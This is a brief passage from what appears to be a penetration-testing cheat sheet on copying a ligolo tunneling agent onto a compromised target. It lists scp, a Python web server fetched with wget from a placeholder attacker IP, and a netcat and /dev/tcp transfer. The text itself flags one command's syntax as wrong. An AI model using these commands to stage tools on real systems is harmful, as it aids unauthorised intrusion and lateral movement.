#### copy the agent to target:
In another window once the above commands are all followed we need to push the agent file onto the target machine. You can accomplish this by running a python web server in the directory where the agent file resides.
```
scp ligolo-agent target@ip:~/
```
### if ssh not enabled:
`python web server`
```
attacker$ sudo python -m http.server 80

# on target with wget
wget http://<your attacker machine IP here>/lin-agent  
```
### Another Technique
`Tcp connection via netcat`
```
nc -nlvp 4444 # syntax is wrong
cat /dev/tcp/attckerip/port > ligolo

```